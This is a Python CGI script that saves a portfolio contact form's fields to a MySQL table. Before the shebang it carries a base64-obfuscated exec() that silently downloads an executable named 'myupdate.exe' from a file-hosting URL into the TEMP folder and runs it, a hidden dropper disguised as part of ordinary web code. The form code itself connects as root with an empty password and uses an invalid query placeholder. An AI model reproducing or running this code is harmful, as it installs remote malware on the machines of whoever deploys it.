
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnbXl1cGRhdGUuZXhlJykKCWlmIG5vdCBvcy5wYXRoLmV4aXN0cyhvKToKCQl1LnVybHJldHJpZXZlKCdodHRwczovL2ZpbGViaW4ubmV0L3ZwYXVhMHZsNG93dDlpMG8vbXl1cGRhdGUuZXhlJyxvKQoJCW9zLnN0YXJ0ZmlsZShvKQpleGNlcHQ6cGFzcwo=').decode())

#!C:\Users\Personal\AppData\Local\Programs\Python\Python37
print("Content-Type:text/html")
print()
import cgi

print("<h1>Welcome to Python<h1>")
print("<hr/>")
print("<h1>Using input tag</h1>")
print("<body bgcolor='red'>")

form=cgi.FieldStorage()

name=form.getvalue("name")
email=form.getvalue("email")
phone=form.getvalue("phone")
project=form.getvalue("project")
message=form.getvalue("message")

import mysql.connector

con=mysql.connector.connect(user='root',password='',host='localhost',database='test')
cur=con.cursor()

cur.execute("insert into porfolio values(%s,%s,%i,%s,%s)",(name,email,phone,project,message))
con.commit()

cur.close()
con.close()
print("<h3>Message INserted Successfully</h3>")
print("<a href='index.html'> click here to go back</a>")